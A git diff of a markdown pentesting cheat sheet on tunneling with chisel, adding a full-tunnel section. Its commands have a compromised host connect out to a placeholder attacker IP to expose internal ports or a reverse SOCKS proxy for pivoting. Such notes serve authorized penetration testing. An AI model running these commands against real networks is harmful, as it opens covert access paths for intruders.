@@ -1,10 +1,11 @@
 ---
-layout: post
+layout: app
 title: "Tunneling"
-os: ["Windows", "Linux"]
 tags: ["Port Forwarding", "SOCKS", "Tunneling"]
 section: "Tunneling"
 ---
+
+
 
 # Port Forwarding
   
@@ -14,10 +15,23 @@ Start chisel on atack machine
 ./chisel server --reverse -p "listen port"
 ```
 
-
 # Start communication between Attach machine and Compromise Machine
 ```bash
-./chisel client "attacker IP":"attacker Port" R:"local port":"IP to expose":"Port to expose"
+./chisel client [attacker IP:attacker Port] R:[local port:IP to expose]:[Port to expose]
+```
+
+## Full Tunneling
+
+### Attacker
+```bash
+chisel server -p 8081 --reverse
+```
+
+> Set proxychains to listen on 1080 port
+### Target
+
+```powershell
+chisel[.exe] client [attacker_ip:listening_port] R:socks
 ```
 
 # SOCKS
@@ -31,7 +45,7 @@ Start chisel on atack machine
 # Start communication between Attach machine and Compromise Machine
 
 ```bash
-./chisel client "attacker IP":"port" R:socks
+./chisel client [attacker IP:port] R:socks
 ```
 # pivotnacci
 
